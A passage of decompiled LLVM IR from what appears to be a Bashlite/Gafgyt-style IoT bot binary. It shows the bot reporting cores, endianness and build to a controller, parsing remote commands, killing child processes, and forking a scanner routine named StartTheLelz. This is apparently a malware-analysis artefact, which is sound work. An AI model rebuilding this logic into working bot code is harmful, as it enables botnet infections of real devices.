  store i8* inttoptr (i32 5 to i8*), i8** %stack_var_-5424, align 4
  %v2_804d946 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804d91a

dec_label_pc_804d94d:                             ; preds = %dec_label_pc_804d91a
  %v0_804d94d = call i32 @getCoresAmount()
  store i32 %v0_804d94d, i32* @esi, align 4
  %v0_804d954 = call i32 @getEndianness()
  store i32 %v0_804d954, i32* @ebx, align 4
  %v0_804d95b = call i32 @getBuild()
  %v0_804d960 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804d960 = ptrtoint i8* %v0_804d960 to i32
  store i32 %v1_804d960, i32* %edx.global-to-local, align 4
  store i8* %v0_804d960, i8** %stack_var_-5424, align 4
  %v4_804d97d = call i32 @sockprintf(i32 %v1_804d960, i32 ptrtoint ([17 x i8]* @global_var_8052faa.76 to i32))
  br label %dec_label_pc_804e181

dec_label_pc_804d9a1:                             ; preds = %dec_label_pc_804db92, %dec_label_pc_804db4a
  %v2_804d9a4 = mul i32 %storemerge19, 4
  %v9_804d9a4 = and i32 %storemerge19, 1073741824
  %v10_804d9a4 = icmp ne i32 %v9_804d9a4, 0
  store i1 %v10_804d9a4, i1* %cf.global-to-local, align 1
  store i32 %v2_804d9a4, i32* %edx.global-to-local, align 4
  %v0_804d9a9 = load i32, i32* @global_var_805b988.30, align 8
  %v2_804d9ae = add i32 %v0_804d9a9, %v2_804d9a4
  %v1_804d9b1 = inttoptr i32 %v2_804d9ae to i32*
  %v2_804d9b1 = load i32, i32* %v1_804d9b1, align 4
  %v4_804d9c3 = inttoptr i32 %v2_804d9b1 to i8*
  store i8* %v4_804d9c3, i8** %stack_var_-5424, align 4
  %v6_804d9c6 = call i32 @__libc_waitpid(i32 %v2_804d9b1, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp116 = icmp slt i32 %v6_804d9c6, 1
  %.pre = add i32 %storemerge19, 1
  br i1 %tmp116, label %dec_label_pc_804db47, label %dec_label_pc_804d9d3

dec_label_pc_804d9d3:                             ; preds = %dec_label_pc_804d9a1
  br label %dec_label_pc_804da06

dec_label_pc_804d9dc:                             ; preds = %dec_label_pc_804da06, %dec_label_pc_804da40
  %v2_804d9df = mul i32 %storemerge21, 4
  %v0_804d9e4 = load i32, i32* @global_var_805b988.30, align 8
  %v2_804d9e9 = add i32 %v0_804d9e4, %v2_804d9df
  %v1_804d9ec = add i32 %v2_804d9e9, -4
  store i32 %v2_804d9df, i32* %edx.global-to-local, align 4
  %v1_804d9ff = inttoptr i32 %v2_804d9e9 to i32*
  %v2_804d9ff = load i32, i32* %v1_804d9ff, align 4
  %v2_804da01 = inttoptr i32 %v1_804d9ec to i32*
  store i32 %v2_804d9ff, i32* %v2_804da01, align 4
  %v4_804da03 = add i32 %storemerge21, 1
  br label %dec_label_pc_804da06

dec_label_pc_804da06:                             ; preds = %dec_label_pc_804d9d3, %dec_label_pc_804d9dc
  %storemerge21 = phi i32 [ %v4_804da03, %dec_label_pc_804d9dc ], [ %.pre, %dec_label_pc_804d9d3 ]
  %v0_804da1a = load i32, i32* @global_var_8055908.28, align 8
  store i32 %v0_804da1a, i32* %edx.global-to-local, align 4
  %v0_804da20 = load i32, i32* @global_var_805590c.29, align 4
  %v10_804da38 = icmp eq i32 %v0_804da20, 0
  br i1 %v10_804da38, label %dec_label_pc_804da40, label %dec_label_pc_804d9dc

dec_label_pc_804da40:                             ; preds = %dec_label_pc_804da06
  store i32 0, i32* @esi, align 4
  store i32 %v0_804da1a, i32* @edi, align 4
  %v10_804da54 = icmp ult i32 %storemerge21, %v0_804da1a
  br i1 %v10_804da54, label %dec_label_pc_804d9dc, label %dec_label_pc_804da5c

dec_label_pc_804da5c:                             ; preds = %dec_label_pc_804da40
  %v2_804da5f = mul i32 %storemerge21, 4
  %v0_804da64 = load i32, i32* @global_var_805b988.30, align 8
  %v2_804da69 = add i32 %v2_804da5f, -4
  %v1_804da6c = add i32 %v2_804da69, %v0_804da64
  %v1_804da6f = inttoptr i32 %v1_804da6c to i32*
  store i32 0, i32* %v1_804da6f, align 4
  %v0_804da75 = load i32, i32* @global_var_8055908.28, align 8
  %v0_804da7a = load i32, i32* @global_var_805590c.29, align 4
  %v1_804da80 = add i32 %v0_804da75, -1
  %v4_804da80 = icmp ne i32 %v0_804da75, 0
  %v2_804da83 = zext i1 %v4_804da80 to i32
  %v3_804da83 = add i32 %v0_804da7a, -1
  %v4_804da83 = add i32 %v3_804da83, %v2_804da83
  store i32 %v1_804da80, i32* @global_var_8055908.28, align 8
  store i32 %v4_804da83, i32* @global_var_805590c.29, align 4
  %v3_804da9c = mul i32 %v4_804da83, 4
  %v4_804da9c = udiv i32 %v1_804da80, 1073741824
  %v5_804da9c = or i32 %v3_804da9c, %v4_804da9c
  store i32 %v5_804da9c, i32* %edx.global-to-local, align 4
  %v2_804daa0 = mul i32 %v1_804da80, 4
  %v1_804daa3 = add i32 %v2_804daa0, 4
  %v5_804daa3 = icmp eq i32 %v2_804daa0, -4
  store i1 %v5_804daa3, i1* %cf.global-to-local, align 1
  %v4_804daa6 = inttoptr i32 %v1_804daa3 to i8*
  store i8* %v4_804daa6, i8** %stack_var_-5424, align 4
  %v2_804daa9 = call i32 @malloc(i32 %v1_804daa3)
  br label %dec_label_pc_804dadc

dec_label_pc_804daba:                             ; preds = %dec_label_pc_804dadc, %dec_label_pc_804db16
  %v2_804dabd = mul i32 %storemerge20, 4
  %v5_804dac2 = add i32 %v2_804dabd, %v2_804daa9
  store i32 %v2_804dabd, i32* %edx.global-to-local, align 4
  %v0_804dacd = load i32, i32* @global_var_805b988.30, align 8
  %v2_804dad2 = add i32 %v0_804dacd, %v2_804dabd
  %v1_804dad5 = inttoptr i32 %v2_804dad2 to i32*
  %v2_804dad5 = load i32, i32* %v1_804dad5, align 4
  %v2_804dad7 = inttoptr i32 %v5_804dac2 to i32*
  store i32 %v2_804dad5, i32* %v2_804dad7, align 4
  %v4_804dad9 = add i32 %storemerge20, 1
  br label %dec_label_pc_804dadc

dec_label_pc_804dadc:                             ; preds = %dec_label_pc_804da5c, %dec_label_pc_804daba
  %storemerge20 = phi i32 [ %v4_804dad9, %dec_label_pc_804daba ], [ 0, %dec_label_pc_804da5c ]
  %v0_804daf0 = load i32, i32* @global_var_8055908.28, align 8
  store i32 %v0_804daf0, i32* %edx.global-to-local, align 4
  %v0_804daf6 = load i32, i32* @global_var_805590c.29, align 4
  %v10_804db0e = icmp eq i32 %v0_804daf6, 0
  br i1 %v10_804db0e, label %dec_label_pc_804db16, label %dec_label_pc_804daba

dec_label_pc_804db16:                             ; preds = %dec_label_pc_804dadc
  store i32 0, i32* @esi, align 4
  store i32 %v0_804daf0, i32* @edi, align 4
  %v10_804db2a = icmp ult i32 %storemerge20, %v0_804daf0
  br i1 %v10_804db2a, label %dec_label_pc_804daba, label %dec_label_pc_804db32

dec_label_pc_804db32:                             ; preds = %dec_label_pc_804db16
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804db32 = load i32, i32* @global_var_805b988.30, align 8
  %v4_804db37 = inttoptr i32 %v0_804db32 to i8*
  store i8* %v4_804db37, i8** %stack_var_-5424, align 4
  %v2_804db3a = call i32 @free(i32 %v0_804db32)
  store i32 %v2_804daa9, i32* @global_var_805b988.30, align 8
  br label %dec_label_pc_804db47

dec_label_pc_804db47:                             ; preds = %dec_label_pc_804d9a1, %dec_label_pc_804db32
  br label %dec_label_pc_804db4a

dec_label_pc_804db4a:                             ; preds = %dec_label_pc_804e181, %dec_label_pc_804db47
  %storemerge19 = phi i32 [ %.pre, %dec_label_pc_804db47 ], [ 0, %dec_label_pc_804e181 ]
  %v1_804db53 = ashr i32 %storemerge19, 31
  store i32 %v1_804db53, i32* %edx.global-to-local, align 4
  %v0_804db5a = load i32, i32* @global_var_8055908.28, align 8
  store i32 %v0_804db5a, i32* @esi, align 4
  %v0_804db60 = load i32, i32* @global_var_805590c.29, align 4
  store i32 %v0_804db60, i32* @edi, align 4
  %v10_804db78 = icmp ult i32 %v1_804db53, %v0_804db60
  store i1 %v10_804db78, i1* %cf.global-to-local, align 1
  br i1 %v10_804db78, label %dec_label_pc_804d9a1, label %dec_label_pc_804db84

dec_label_pc_804db84:                             ; preds = %dec_label_pc_804db4a
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804db90 = icmp ugt i32 %v1_804db53, %v0_804db60
  br i1 %v6_804db90, label %dec_label_pc_804dba4, label %dec_label_pc_804db92

dec_label_pc_804db92:                             ; preds = %dec_label_pc_804db84
  store i32 %v0_804db5a, i32* %edx.global-to-local, align 4
  %v10_804db98 = icmp ult i32 %storemerge19, %v0_804db5a
  store i1 %v10_804db98, i1* %cf.global-to-local, align 1
  br i1 %v10_804db98, label %dec_label_pc_804d9a1, label %dec_label_pc_804dba4

dec_label_pc_804dba4:                             ; preds = %dec_label_pc_804db92, %dec_label_pc_804db84
  %v0_804dba7 = load i32, i32* @ebp, align 4
  %v2_804dba7 = add i32 %v7_804e19c, -5244
  %v3_804dba7 = add i32 %v2_804dba7, %v0_804dba7
  %v4_804dba7 = inttoptr i32 %v3_804dba7 to i8*
  store i8 0, i8* %v4_804dba7, align 1
  store i8* %tmp113, i8** %stack_var_-5424, align 4
  %v3_804dbb8 = call i32 @trim(i8* %tmp113)
  %v3_804dbc3 = load i32, i32* %v2_804d7c2, align 4
  %v1_804dbc6 = inttoptr i32 %v3_804dbc3 to i32*
  %v2_804dbc6 = load i32, i32* %v1_804dbc6, align 4
  %v4_804dbe3 = inttoptr i32 %v2_804dbc6 to i8*
  store i32 %v2_804dbc6, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8052fbb.77 to i32), i32* @edi, align 4
  %v7_804dbf5 = call i32 @_strncmp(i8* %v4_804dbe3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8052fbb.77, i32 0, i32 0), i32 8)
  %v8_804dbf5 = urem i32 %v7_804dbf5, 2
  %v9_804dbf5 = icmp eq i32 %v8_804dbf5, 0
  %v0_804dbf7 = load i1, i1* @cf, align 1
  %v2_804dbf7 = or i1 %v0_804dbf7, %v9_804dbf5
  %v3_804dbf7 = zext i1 %v2_804dbf7 to i32
  %v4_804dbf7 = load i32, i32* @edx, align 4
  %v5_804dbf7 = and i32 %v4_804dbf7, -256
  %v6_804dbf7 = or i32 %v3_804dbf7, %v5_804dbf7
  %v7_804dbf7 = xor i32 %v6_804dbf7, 1
  store i32 %v7_804dbf7, i32* %edx.global-to-local, align 4
  %v1_804dbff = trunc i32 %v7_804dbf7 to i8
  %v3_804dbff = zext i1 %v0_804dbf7 to i8
  %v15_804dbff = icmp eq i8 %v1_804dbff, %v3_804dbff
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dc08 = icmp eq i1 %v15_804dbff, false
  br i1 %v1_804dc08, label %dec_label_pc_804dd7f, label %dec_label_pc_804dc0e

dec_label_pc_804dc0e:                             ; preds = %dec_label_pc_804dba4
  store i32 %v2_804d760, i32* @esi, align 4
  %v2_804dc14 = load i32, i32* %stack_var_4, align 4
  %v7_804dc14 = icmp ult i32 %v2_804dc14, 2
  store i1 %v7_804dc14, i1* %cf.global-to-local, align 1
  %v11_804dc14 = icmp eq i32 %v2_804dc14, 2
  br i1 %v11_804dc14, label %dec_label_pc_804dc33, label %dec_label_pc_804dc19

dec_label_pc_804dc19:                             ; preds = %dec_label_pc_804dc0e
  %v0_804dc19 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804dc19 = ptrtoint i8* %v0_804dc19 to i32
  store i8* %v0_804dc19, i8** %stack_var_-5424, align 4
  %v4_804dc29 = call i32 @sockprintf(i32 %v1_804dc19, i32 ptrtoint ([17 x i8]* @global_var_8052fc3.78 to i32))
  br label %dec_label_pc_804e1b3

dec_label_pc_804dc33:                             ; preds = %dec_label_pc_804dc0e
  %v3_804dc39 = load i32, i32* %v2_804d7c2, align 4
  %v1_804dc3c = add i32 %v3_804dc39, 4
  %v5_804dc3c = icmp ugt i32 %v3_804dc39, -5
  store i1 %v5_804dc3c, i1* %cf.global-to-local, align 1
  %v1_804dc3f = inttoptr i32 %v1_804dc3c to i32*
  %v2_804dc3f = load i32, i32* %v1_804dc3f, align 4
  %v4_804dc5c = inttoptr i32 %v2_804dc3f to i8*
  store i32 %v2_804dc3f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052fd4.79 to i32), i32* @edi, align 4
  %v7_804dc6e = call i32 @_strncmp(i8* %v4_804dc5c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052fd4.79, i32 0, i32 0), i32 4)
  %v8_804dc6e = urem i32 %v7_804dc6e, 2
  %v9_804dc6e = icmp eq i32 %v8_804dc6e, 0
  %v0_804dc70 = load i1, i1* %cf.global-to-local, align 1
  %v2_804dc70 = or i1 %v0_804dc70, %v9_804dc6e
  %v3_804dc70 = zext i1 %v2_804dc70 to i32
  %v4_804dc70 = load i32, i32* %edx.global-to-local, align 4
  %v5_804dc70 = and i32 %v4_804dc70, -256
  %v6_804dc70 = or i32 %v3_804dc70, %v5_804dc70
  %v7_804dc70 = xor i32 %v6_804dc70, 1
  store i32 %v7_804dc70, i32* @edx, align 4
  %v1_804dc78 = trunc i32 %v7_804dc70 to i8
  %v3_804dc78 = zext i1 %v0_804dc70 to i8
  %v15_804dc78 = icmp eq i8 %v1_804dc78, %v3_804dc78
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dc81 = icmp eq i1 %v15_804dc78, false
  br i1 %v1_804dc81, label %dec_label_pc_804dcc4, label %dec_label_pc_804dc83

dec_label_pc_804dc83:                             ; preds = %dec_label_pc_804dc33
  %v0_804dc83 = load i32, i32* @global_var_805b984.80, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dc88 = icmp eq i32 %v0_804dc83, 0
  br i1 %v1_804dc88, label %dec_label_pc_804e1b3, label %dec_label_pc_804dc90

dec_label_pc_804dc90:                             ; preds = %dec_label_pc_804dc83
  %v0_804dc90 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804dc90 = ptrtoint i8* %v0_804dc90 to i32
  store i8* %v0_804dc90, i8** %stack_var_-5424, align 4
  %v4_804dca0 = call i32 @sockprintf(i32 %v1_804dc90, i32 ptrtoint ([17 x i8]* @global_var_8052fd8.81 to i32))
  %v0_804dca5 = load i32, i32* @global_var_805b984.80, align 4
  %v4_804dcb2 = inttoptr i32 %v0_804dca5 to i8*
  store i8* %v4_804dcb2, i8** %stack_var_-5424, align 4
  %v4_804dcb5 = call i32 @kill(i32 %v0_804dca5, i32 9)
  store i32 0, i32* @global_var_805b984.80, align 4
  br label %dec_label_pc_804dcc4

dec_label_pc_804dcc4:                             ; preds = %dec_label_pc_804dc33, %dec_label_pc_804dc90
  %v3_804dcca = load i32, i32* %v2_804d7c2, align 4
  %v1_804dccd = add i32 %v3_804dcca, 4
  %v5_804dccd = icmp ugt i32 %v3_804dcca, -5
  store i1 %v5_804dccd, i1* %cf.global-to-local, align 1
  %v1_804dcd0 = inttoptr i32 %v1_804dccd to i32*
  %v2_804dcd0 = load i32, i32* %v1_804dcd0, align 4
  %v4_804dced = inttoptr i32 %v2_804dcd0 to i8*
  store i32 %v2_804dcd0, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052fe9.82 to i32), i32* @edi, align 4
  %v7_804dcff = call i32 @_strncmp(i8* %v4_804dced, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8052fe9.82, i32 0, i32 0), i32 3)
  %v8_804dcff = urem i32 %v7_804dcff, 2
  %v9_804dcff = icmp eq i32 %v8_804dcff, 0
  %v0_804dd01 = load i1, i1* %cf.global-to-local, align 1
  %v2_804dd01 = or i1 %v0_804dd01, %v9_804dcff
  %v3_804dd01 = zext i1 %v2_804dd01 to i32
  %v4_804dd01 = load i32, i32* @edx, align 4
  %v5_804dd01 = and i32 %v4_804dd01, -256
  %v6_804dd01 = or i32 %v3_804dd01, %v5_804dd01
  %v7_804dd01 = xor i32 %v6_804dd01, 1
  store i32 %v7_804dd01, i32* %edx.global-to-local, align 4
  %v1_804dd09 = trunc i32 %v7_804dd01 to i8
  %v3_804dd09 = zext i1 %v0_804dd01 to i8
  %v15_804dd09 = icmp eq i8 %v1_804dd09, %v3_804dd09
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dd12 = icmp eq i1 %v15_804dd09, false
  br i1 %v1_804dd12, label %dec_label_pc_804dd7f, label %dec_label_pc_804dd14

dec_label_pc_804dd14:                             ; preds = %dec_label_pc_804dcc4
  %v0_804dd14 = load i32, i32* @global_var_805b984.80, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dd19 = icmp eq i32 %v0_804dd14, 0
  %v1_804dd1b = icmp eq i1 %v1_804dd19, false
  br i1 %v1_804dd1b, label %dec_label_pc_804e1b3, label %dec_label_pc_804dd21

dec_label_pc_804dd21:                             ; preds = %dec_label_pc_804dd14
  %v1_804dd21 = call i32 @__libc_fork(i32 3)
  store i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_8052fec.83, i32 0, i32 0), i8** %stack_var_-5424, align 4
  %v2_804dd30 = call i32 @puts(i32 ptrtoint ([28 x i8]* @global_var_8052fec.83 to i32))
  %v0_804dd35 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804dd35 = ptrtoint i8* %v0_804dd35 to i32
  store i8* %v0_804dd35, i8** %stack_var_-5424, align 4
  %v4_804dd45 = call i32 @sockprintf(i32 %v1_804dd35, i32 ptrtoint ([17 x i8]* @global_var_8053008.84 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804dd4a = icmp eq i32 %v1_804dd21, 0
  br i1 %v4_804dd4a, label %dec_label_pc_804dd67, label %dec_label_pc_804dd50

dec_label_pc_804dd50:                             ; preds = %dec_label_pc_804dd21
  store i32 %v1_804dd21, i32* @global_var_805b984.80, align 4
  br label %dec_label_pc_804e1b3

dec_label_pc_804dd67:                             ; preds = %dec_label_pc_804dd21
  store i1 true, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-5424, align 4
  %v2_804dd6e = call i32 @StartTheLelz(i32 1)
  store i8* null, i8** %stack_var_-5424, align 4
  %v2_804dd7a = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804dd7f:                             ; preds = %dec_label_pc_804dcc4, %dec_label_pc_804dba4
  store i8* %tmp113, i8** %stack_var_-5424, align 4
  %v5_804dd90 = call i32 @strstr(i32 %v2_804e181, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052e57.27, i32 0, i32 0))
  store i32 %v5_804dd90, i32* %edx.global-to-local, align 4
  %v7_804dd9d = icmp ult i32 %v5_804dd90, %v2_804e181
  store i1 %v7_804dd9d, i1* %cf.global-to-local, align 1
  %v12_804dd9d = icmp eq i32 %v5_804dd90, %v2_804e181
  %v1_804dd9f = icmp eq i1 %v12_804dd9d, false
  br i1 %v1_804dd9f, label %dec_label_pc_804ddbb, label %dec_label_pc_804dda1

dec_label_pc_804dda1:                             ; preds = %dec_label_pc_804dd7f
  %v0_804dda1 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804dda1 = ptrtoint i8* %v0_804dda1 to i32
  store i8* %v0_804dda1, i8** %stack_var_-5424, align 4
  %v4_804ddb1 = call i32 @sockprintf(i32 %v1_804dda1, i32 ptrtoint ([5 x i8]* @global_var_8053019.85 to i32))
  br label %dec_label_pc_804e181

dec_label_pc_804ddbb:                             ; preds = %dec_label_pc_804dd7f
  store i8* %tmp113, i8** %stack_var_-5424, align 4
  %v5_804ddcc = call i32 @strstr(i32 %v2_804e181, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805301e.86, i32 0, i32 0))
  store i32 %v5_804ddcc, i32* @edx, align 4
  store i32 %v2_804e181, i32* @eax, align 4
  %v7_804ddd9 = icmp ult i32 %v5_804ddcc, %v2_804e181
  store i1 %v7_804ddd9, i1* %cf.global-to-local, align 1
  %v12_804ddd9 = icmp eq i32 %v5_804ddcc, %v2_804e181
  %v1_804dddb = icmp eq i1 %v12_804ddd9, false
  br i1 %v1_804dddb, label %dec_label_pc_804dde9, label %dec_label_pc_804dddd

dec_label_pc_804dddd:                             ; preds = %dec_label_pc_804ddbb
  store i8* null, i8** %stack_var_-5424, align 4
  %v2_804dde4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804dde9

dec_label_pc_804dde9:                             ; preds = %dec_label_pc_804ddbb, %dec_label_pc_804dddd
  %v2_804ddf5 = load i8, i8* %tmp113, align 4
  %v6_804ddf8 = icmp ult i8 %v2_804ddf5, 33
  store i1 %v6_804ddf8, i1* %cf.global-to-local, align 1
  %v10_804ddf8 = icmp eq i8 %v2_804ddf5, 33
  %v1_804ddfa = icmp eq i1 %v10_804ddf8, false
  br i1 %v1_804ddfa, label %dec_label_pc_804e181, label %dec_label_pc_804de00

dec_label_pc_804de00:                             ; preds = %dec_label_pc_804dde9
  %v2_804de0f119 = load i8, i8* %v5_804de38, align 1
  %v3_804de12122 = icmp ult i8 %v2_804de0f119, 32
  store i1 %v3_804de12122, i1* %cf.global-to-local, align 1
  %v7_804de12126 = icmp eq i8 %v2_804de0f119, 32
  br i1 %v7_804de12126, label %dec_label_pc_804de20, label %dec_label_pc_804de16

dec_label_pc_804de09:                             ; preds = %dec_label_pc_804de16
  %v5_804de09 = add i32 %storemerge18.in128, 1
  %storemerge18 = inttoptr i32 %v5_804de09 to i8*
  %v2_804de0f = load i8, i8* %storemerge18, align 1
  %v3_804de12 = icmp ult i8 %v2_804de0f, 32
  store i1 %v3_804de12, i1* %cf.global-to-local, align 1
  %v7_804de12 = icmp eq i8 %v2_804de0f, 32
  br i1 %v7_804de12, label %dec_label_pc_804de20, label %dec_label_pc_804de16

dec_label_pc_804de16:                             ; preds = %dec_label_pc_804de00, %dec_label_pc_804de09
  %storemerge18129 = phi i8* [ %storemerge18, %dec_label_pc_804de09 ], [ %v5_804de38, %dec_label_pc_804de00 ]
  %storemerge18.in128 = phi i32 [ %v5_804de09, %dec_label_pc_804de09 ], [ %v1_804de03, %dec_label_pc_804de00 ]
  %v2_804de19 = load i8, i8* %storemerge18129, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804de1c = icmp eq i8 %v2_804de19, 0
  %v1_804de1e = icmp eq i1 %v4_804de1c, false
  br i1 %v1_804de1e, label %dec_label_pc_804de09, label %dec_label_pc_804de20

dec_label_pc_804de20:                             ; preds = %dec_label_pc_804de09, %dec_label_pc_804de16, %dec_label_pc_804de00
  %storemerge18.lcssa = phi i8* [ %v5_804de38, %dec_label_pc_804de00 ], [ %storemerge18129, %dec_label_pc_804de16 ], [ %storemerge18, %dec_label_pc_804de09 ]
  %v2_804de23 = load i8, i8* %storemerge18.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804de26 = icmp eq i8 %v2_804de23, 0
  br i1 %v4_804de26, label %dec_label_pc_804e181, label %dec_label_pc_804de2e

dec_label_pc_804de2e:                             ; preds = %dec_label_pc_804de20
  store i8 0, i8* %storemerge18.lcssa, align 1
  %v3_804de52 = call i32 @_strlen(i8* %v5_804de38)
  %v6_804de59 = add i32 %v2_804e181, %v3_804de52
  %v1_804de5c = add i32 %v6_804de59, 2
  %v5_804de5c = icmp ugt i32 %v6_804de59, -3
  store i1 %v5_804de5c, i1* %cf.global-to-local, align 1
  %v5_804de5f = inttoptr i32 %v1_804de5c to i8*
  br label %dec_label_pc_804de89

dec_label_pc_804de64:                             ; preds = %dec_label_pc_804deb2, %dec_label_pc_804de89
  %v3_804de7b = call i32 @_strlen(i8* %v5_804de5f)
  %v4_804de7b = mul i32 %v3_804de7b, -1
  %v1_804de81 = sub i32 0, %v4_804de7b
  %v6_804de82 = sub i32 %v1_804de5c, %v4_804de7b
  %v11_804de82 = icmp ult i32 %v6_804de82, %v1_804de81
  store i1 %v11_804de82, i1* %cf.global-to-local, align 1
  %v1_804de85 = add i32 %v6_804de82, -1
  %v1_804de86 = inttoptr i32 %v1_804de85 to i8*
  store i8 0, i8* %v1_804de86, align 1
  br label %dec_label_pc_804de89

dec_label_pc_804de89:                             ; preds = %dec_label_pc_804de2e, %dec_label_pc_804de64
  %v3_804dea0 = call i32 @_strlen(i8* %v5_804de5f)
  %v4_804dea0 = mul i32 %v3_804dea0, -1
  %v1_804dea6 = sub i32 0, %v4_804dea0
  %v6_804dea7 = sub i32 %v1_804de5c, %v4_804dea0
  %v11_804dea7 = icmp ult i32 %v6_804dea7, %v1_804dea6
  store i1 %v11_804dea7, i1* %cf.global-to-local, align 1
  %v1_804deaa = add i32 %v6_804dea7, -1
  %v1_804deab = inttoptr i32 %v1_804deaa to i8*
  %v2_804deab = load i8, i8* %v1_804deab, align 1
  %v6_804deae = icmp ult i8 %v2_804deab, 10
  store i1 %v6_804deae, i1* %cf.global-to-local, align 1
  %v10_804deae = icmp eq i8 %v2_804deab, 10
  br i1 %v10_804deae, label %dec_label_pc_804de64, label %dec_label_pc_804deb2

dec_label_pc_804deb2:                             ; preds = %dec_label_pc_804de89
  %v3_804dec9 = call i32 @_strlen(i8* %v5_804de5f)
  %v4_804dec9 = mul i32 %v3_804dec9, -1
  %v1_804decf = sub i32 0, %v4_804dec9
  %v6_804ded0 = sub i32 %v1_804de5c, %v4_804dec9
  %v11_804ded0 = icmp ult i32 %v6_804ded0, %v1_804decf
  store i1 %v11_804ded0, i1* %cf.global-to-local, align 1
  %v1_804ded3 = add i32 %v6_804ded0, -1
  %v1_804ded4 = inttoptr i32 %v1_804ded3 to i8*
  %v2_804ded4 = load i8, i8* %v1_804ded4, align 1
  %v6_804ded7 = icmp ult i8 %v2_804ded4, 13
  store i1 %v6_804ded7, i1* %cf.global-to-local, align 1
  %v10_804ded7 = icmp eq i8 %v2_804ded4, 13
  br i1 %v10_804ded7, label %dec_label_pc_804de64, label %dec_label_pc_804dedb

dec_label_pc_804dedb:                             ; preds = %dec_label_pc_804deb2
  %v2_804dee9134 = load i8, i8* %v5_804de5f, align 1
  %v3_804deec137 = icmp ult i8 %v2_804dee9134, 32
  store i1 %v3_804deec137, i1* %cf.global-to-local, align 1
  %v7_804deec141 = icmp eq i8 %v2_804dee9134, 32
  br i1 %v7_804deec141, label %dec_label_pc_804defa, label %dec_label_pc_804def0

dec_label_pc_804dee3:                             ; preds = %dec_label_pc_804def0
  %v5_804dee3 = add i32 %v4_804dee6144, 1
  %v22_804dee3 = inttoptr i32 %v5_804dee3 to i8*
  %v2_804dee9 = load i8, i8* %v22_804dee3, align 1
  %v3_804deec = icmp ult i8 %v2_804dee9, 32
  store i1 %v3_804deec, i1* %cf.global-to-local, align 1
  %v7_804deec = icmp eq i8 %v2_804dee9, 32
  br i1 %v7_804deec, label %dec_label_pc_804defa, label %dec_label_pc_804def0

dec_label_pc_804def0:                             ; preds = %dec_label_pc_804dedb, %dec_label_pc_804dee3
  %v4_804dee6144 = phi i32 [ %v5_804dee3, %dec_label_pc_804dee3 ], [ %v1_804de5c, %dec_label_pc_804dedb ]
  %stack_var_-68.0143 = phi i8* [ %v22_804dee3, %dec_label_pc_804dee3 ], [ %v5_804de5f, %dec_label_pc_804dedb ]
  %v2_804def3 = load i8, i8* %stack_var_-68.0143, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804def6 = icmp eq i8 %v2_804def3, 0
  %v1_804def8 = icmp eq i1 %v4_804def6, false
  br i1 %v1_804def8, label %dec_label_pc_804dee3, label %dec_label_pc_804defa

dec_label_pc_804defa:                             ; preds = %dec_label_pc_804dee3, %dec_label_pc_804def0, %dec_label_pc_804dedb
  %stack_var_-68.0.lcssa = phi i8* [ %v5_804de5f, %dec_label_pc_804dedb ], [ %stack_var_-68.0143, %dec_label_pc_804def0 ], [ %v22_804dee3, %dec_label_pc_804dee3 ]
  %v4_804dee6.lcssa = phi i32 [ %v1_804de5c, %dec_label_pc_804dedb ], [ %v4_804dee6144, %dec_label_pc_804def0 ], [ %v5_804dee3, %dec_label_pc_804dee3 ]
  store i8 0, i8* %stack_var_-68.0.lcssa, align 1
  %v5_804df00 = add i32 %v4_804dee6.lcssa, 1
  %v2_804df29150 = load i8, i8* %v5_804de5f, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804df2c152 = icmp eq i8 %v2_804df29150, 0
  %v1_804df2e154 = icmp eq i1 %v4_804df2c152, false
  br i1 %v1_804df2e154, label %dec_label_pc_804df0b, label %dec_label_pc_804df30

dec_label_pc_804df0b:                             ; preds = %dec_label_pc_804defa, %dec_label_pc_804df0b
  %storemerge17156 = phi i8* [ %storemerge17, %dec_label_pc_804df0b ], [ %v5_804de5f, %dec_label_pc_804defa ]
  %storemerge17.in155 = phi i32 [ %v5_804df23, %dec_label_pc_804df0b ], [ %v1_804de5c, %dec_label_pc_804defa ]
  %v2_804df0e = load i8, i8* %storemerge17156, align 1
  %v3_804df0e = zext i8 %v2_804df0e to i32
  %v4_804df14 = inttoptr i32 %v3_804df0e to i8*
  store i8* %v4_804df14, i8** %stack_var_-5424, align 4
  %v2_804df17 = call i32 @__GI_toupper(i32 %v3_804df0e)
  %v1_804df1c = urem i32 %v2_804df17, 256
  %v2_804df1c = load i32, i32* @edx, align 4
  %v3_804df1c = and i32 %v2_804df1c, -256
  %v4_804df1c = or i32 %v3_804df1c, %v1_804df1c
  store i32 %v4_804df1c, i32* @edx, align 4
  %v1_804df21 = trunc i32 %v2_804df17 to i8
  store i8 %v1_804df21, i8* %storemerge17156, align 1
  %v5_804df23 = add i32 %storemerge17.in155, 1
  %storemerge17 = inttoptr i32 %v5_804df23 to i8*
